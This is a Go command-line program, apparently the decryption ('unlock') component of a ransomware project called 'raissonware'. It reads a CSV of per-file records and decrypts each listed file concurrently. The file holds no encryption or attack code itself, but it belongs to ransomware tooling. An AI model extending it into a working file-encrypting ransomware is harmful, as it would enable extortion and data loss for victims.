package main

import (
	"fmt"
	"log"
	"os"
	"raissonware/pkg/csv"
	"raissonware/pkg/ransomware"
	"sync"
)

var (
	Wg sync.WaitGroup
)

func main() {
	defer Wg.Wait()

	if len(os.Args) != 2 {
		fmt.Println("Usage: unlock <path>")
		return
	}

	csvPath := os.Args[1]
	var rowData *ransomware.RansomRow

	csvData, err := csv.LoadCSV(csvPath)
	if err != nil {
		log.Fatal(err)
	}

	for _, row := range csvData {
		rowData, err = ransomware.ArrayOfStringToRansomRow(row)
		if err != nil {
			log.Fatal(err)
		}

		ransomware.DecryptFile(*rowData, &Wg)
	}
}
